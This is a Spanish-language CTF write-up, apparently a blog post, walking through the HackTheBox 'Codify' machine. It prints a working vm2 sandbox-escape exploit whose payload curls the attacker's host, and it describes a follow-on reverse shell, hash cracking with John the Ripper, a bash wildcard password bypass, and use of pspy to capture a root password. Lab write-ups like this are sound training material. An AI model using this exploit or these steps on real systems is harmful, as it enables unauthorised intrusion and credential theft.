+++ 
draft = false
date = 2023-12-11T17:09:37+01:00
title = "Guía de Codify en HackTheBox"
description = "Un tutorial para la máquina HTB \"Codify\""
slug = ""
authors = ["Raul Bulgariu Suciu"]
tags = ["Tutorial", "Hacking", "HTB"]
categories = []
externalLink = ""
series = []
+++

{{<betterfigure src="./files/title.png" alt="Title card">}}

Bienvenido a mi primera guía CTF! Hoy voy a guiarte a cómo hackear la máquina "Codify" de HackTheBox:

# Reconocimiento básico

Ejecutando un escaneo Nmap te darás cuenta de que tenemos tres puertos abiertos en el servidor: **SSH**, **Apache** y una instancia de NodeJS abierta, aunque recomendaría ignorar el último puerto al parecer este una cortina de humo.

{{<betterfigure src="./files/scan.png" alt="Nmap scan">}}

Por ahora asociemos la IP al nombre de dominio para que podamos acceder a la página por navegador web:

{{<betterfigure src="./files/hosts.png" alt="Hosts file">}}

# Ganando un punto de apoyo
Observando la página web, parece ser hecha para probar código NodeJS, lo primero que se viene a la cabeza es un caso de RCE posible utilizando módulos de sistema, aunque ***parece que los desarrolladores de esta página ya lo habían visto venir!***

{{<betterfigure src="./files/disallowed.png" alt="Denied">}}

Navegando la página encontramos una sección "Sobre nosotros" que habla sobre las motivaciones del desarrollador entre otras cosas, pero también hay una sección interesante que no solo habla sobre la librería utilizada para realizar el sandboxing del código, pero incluso nos informa de la versión siendo utilizada! Qué amables de su parte!

> "The [vm2](https://github.com/patriksimek/vm2/releases/tag/3.9.16) library is a widely used and trusted tool for sandboxing JavaScript. It adds an extra layer of security to prevent potentially harmful code from causing harm to your system. We take the security and reliability of our platform seriously, and we use vm2 to ensure a safe testing environment for your code"

Ejecutando una búsqueda en línea, descubrimos que la versión 3.9.16 de vm2 siendo utilizada por el sitio web da la casualidad de que sufre una vulnerabilidad de escape de sandbox, y después de investigar un poco más, podemos incluso encontrar [un exploit](https://gist.github.com/leesh3288/f05730165799bf56d70391f3d9ea187c) para este!

## Travesuras con VM2 (y shells inversas!)

Ahora nos podemos dirigir al probador de código de la página y pegar el exploit a continuación, aunque primero nos gustaría saber si funciona, con lo que probamos a ejecutar un curl a un servidor HTTP de Python alojado en nuestra máquina atacante:

> Acuérdate de modificar `execSync('curl http://10.10.16.95:8000')` y añadir tu propia dirección IP!

```js
const {VM} = require("vm2");
const vm = new VM();

const code = `
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('curl http://10.10.16.95:8000'); }
            )
        }
    }
};
p.then();
`;

console.log(vm.run(code));
```
Ejecutando el código obtenemos un acierto! RCE ha sido confirmado de aquí en adelante y como podrás ver, la petición desde el servidor a nuestro cliente se registró bajo nuestro servidor de HTTP simple.

{{<betterfigure src="./files/hit.png" alt="RCE">}}

Reemplazamos rápidamente nuestro curl con una shell inversa improvisada, abriendo un puerto en nuestra máquina atacante y mándando la shell a este.

{{<betterfigure src="./files/revshell.png" alt="revshell">}}

> ***Pro tip:***
> Shells inversas son inestables y son usualmente interrumpidas por acciones simples como pulsar Ctrl+C, ejecutando los siguientes comandos sin embargo te permitirá estabilizar la shell y realizar acciones interactivas con esta (ejecutar comandos con sudo y pulsar Ctrl+C):
> 1. `python3 -c "import pty;pty.spawn('/bin/bash')"` (Asegúrate de que Python esté instalado en el sistema, busca alternativas [aquí](https://github.com/RoqueNight/Reverse-Shell-TTY-Cheat-Sheet) sí no lo está)
> 2. `export TERM=xterm`
> 3. Ahora pulsa Ctrl+Z para congelar la shell antes de proceder con el último comando.
> 4. `stty raw -echo; fg`

## Navegando a través del sistema

Como te habrás dado cuenta, no hay mucho que podamos hacer como este usuario "svc" a parte de observar los archivos de prueba creados por otros hackers de HackTheBox atacando a la máquina, sin embargo, si echamos un vistazo al directorio raíz genérico para servir HTTP, encontramos dos directorios distintos de /var/www/html:

{{<betterfigure src="./files/files.png" alt="Interesting files">}}

Interesante, parece haber un archivo de base de datos para ticketing...

Inspeccionando el archivo, descubrimos que es una base de datos Sqlite, y si accedemos a esta, podemos encontrar dos tablas guardadas en esta:

{{<betterfigure src="./files/sqlite.png" alt="Sqlite">}}

Bingo! Además de la graciosa tabla de tickets, hemos encontrado una segunda tabla con la hash de contraseña para un usuario llamado "joshua", y es posible que te hayas dado cuenta durante tu exploración como "svc" que había un segundo usuario en el servidor llamado "joshua", así que ahora es el momento de una acción de fuerza bruta.

## Destripando unas credenciales SSH!

Sospechamos que la hash de contraseña obtenida de la base de datos Sqlite podría ser la contraseña del usuario "joshua" del servidor, con lo que la añadimos inmediatamente a un archivo y dejamos a nuestro fiel [*John The Ripper*](https://www.openwall.com/john/) (o John el Destripador) atacar el hash a fuerza bruta utilizando la lista de palabras rockyou.txt como nuestro diccionario de ataque.

{{<betterfigure src="./files/johntheripper.png" alt="John The Ripper">}}

Y funciona! Desafortunadamente no puedo mostrar la contraseña ya que esto invalidaría todos los pasos anteriores, pero te puedo asegurar que es definitivamente una contraseña muy simple y graciosa una vez la rompes!

Utilizando las credenciales rotas podemos iniciar sesión a través de SSH en la cuenta de joshua y recuperar la bandera **user.txt**.
{{<betterfigure src="./files/ssh.png" alt="SSH">}}
{{<betterfigure src="./files/flag.png" alt="User flag">}}

# Escalando nuestros privilegios

Ahora que por fin tenemos acceso a una cuenta de servidor adecuada, podemos empezar a buscar formas de alcanzar la cuenta root.

Usualmente un buen lugar donde empezar es revisar si tenemos permisos para ejecutar cualquier comando como sudo utilizando `sudo -l`, y parece que tenemos un script que podemos ejecutar como root:

{{<betterfigure src="./files/script.png" alt="Script">}}

{{<betterfigure src="./files/scriptcontent.png" alt="Script content">}}

Revisando el contenido del script, vemos que guarda los contenidos de un archivo de credenciales dentro de una variable llamada **"DB_PASS"**, y luego procede a comparar esa variable con la contraseña que nos pide antes de ejecutar algunos comandos de copia de seguridad de MySQL cuando intentamos ejecutar el script...

{{<betterfigure src="./files/attempt.png" alt="Pitiful attempt">}}

## *Siempre es más simple de lo que parece*

Uno podría pensar en intentar realizar un ataque de fuerza bruta ya que no parece haber ninguna medida implementada para evitar este tipo de ataque, pero si estás familiarizado con Bash, probablemente conoces el concepto de comodines, entonces, que pasaría si intentamos introducir un asterisco en el script?

{{<betterfigure src="./files/asterisk.png" alt="Successful asterisk">}}

Bueno eso nos llevó un paso adelante! Creo que la razón por la que esto funcionó fue porque la entrada del usuario no fue desinfectada correctamente, y dado que los comodines pueden equivaler a cualquier valor, comparar la contraseña secreta con un comodín devolvió "True", lo que permite al script continuar más allá de la declaración if/else.

Sin embargo eso no soluciona nuestro problema, puede que podamos ejecutar el script, pero lo único que parece hacer es respaldar bases de datos SQL a un directorio del que no podemos leer. Aunque algo puede destacar es la advertencia avisándonos de que "Utilizar una contraseña en la interfaz de línea de comandos puede ser inseguro", ***y vaya si tenían razón***.

## Espiando nuestro camino hacia root!

Para un poco de historia de fondo, existe una herramienta llamada [pspy](https://github.com/DominicBreuker/pspy) que es capaz de escuchar los eventos del sistema de archivos o cualquier comando que se ejecute dentro del sistema donde lo iniciemos, si revisas el script otra vez, te darás cuenta de que ejecuta los comandos de respaldo de MySQL proporcionando la contraseña de root como parámetro, de ahí las advertencias generadas anteriormente. Puedes ver a dónde va esto?

{{<betterfigure src="./files/pspy.png" alt="pspy">}}

Una vez descargamos el binario, lo mandamos al servidor de Codify en virtud de nuestro servidor de HTTP simple y lo ejecutamos, intentemos ejecutar ese script de nuevo, de acuerdo?

{{<betterfigure src="./files/rootpass.png" alt="Root password">}}

Y ahí está! La contraseña se muestra en texto plano cuando ejecutamos el script gracias a pspy, con esta contraseña ejecutamos `su -` inmediatamente para acceder a la cuenta root y recuperamos la bandera **root.txt**!
